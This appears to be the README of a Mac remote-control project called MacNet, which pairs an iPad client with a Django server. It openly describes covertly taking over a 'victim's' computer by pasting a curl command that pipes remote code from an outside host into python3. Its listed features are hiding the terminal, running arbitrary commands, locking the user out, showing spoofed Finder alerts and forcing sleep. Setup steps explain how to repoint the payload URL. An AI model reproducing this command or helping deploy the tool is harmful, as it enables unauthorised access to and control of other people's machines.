# MacNet Control Panel 

MacNet is a piece of software that allows you to remotely control someone else's Mac computer using an iOS control panel. To gain control of their computer, all you have to do is type the simple command `curl https://macnetback-nylr.c9users.io/getc | python3` into their terminal. The program will automatically hide the terminal, and you will have full access.

# Core Features

- The dark screen at the top of the page allows you to tap any location and control the position of the mouse on the victim's computer 
- The OpenURL form allows you to open any URL on the victim's default browser 
- The create Alert form allows you to send an alert to the victim's computer (it will display from "Finder") 
- The execute form allows you to execute any command in the user's terminal 
- The volume slider allows you to change the volume on the user's computer 
- The "Disable" button allows you prevent the user from controlling their computer 
- The "Sleep" button forces the victim's computer to sleep

# Setup

- Clone this repository 
- Open the `MacNet` folder, and run the Xcode project. This is the client you will use to control the victim's computer, and no additional setup should be necessary.
  - Note: the program is only optimized to run on the iPad Pro 10.5 inch. Use other devices/simulators at your own risk.
- The `djangosrc` folder contains all of the server-side logic. 90% of the code I wrote can be found in `djangosrc/api/views.py`, and the rest is simply regex to handle URLs and files that are automatically generated by Django.
   - If you want to run this code, you will need Django version `1.9`. The latest release of the framwork (2.0) will **not** work.
- If you choose to set up the project yourself, you will also obviously need to change the URL that you `curl` on the victim's computer, and the URLs that the Xcode project makes requests to when communicating with the server.
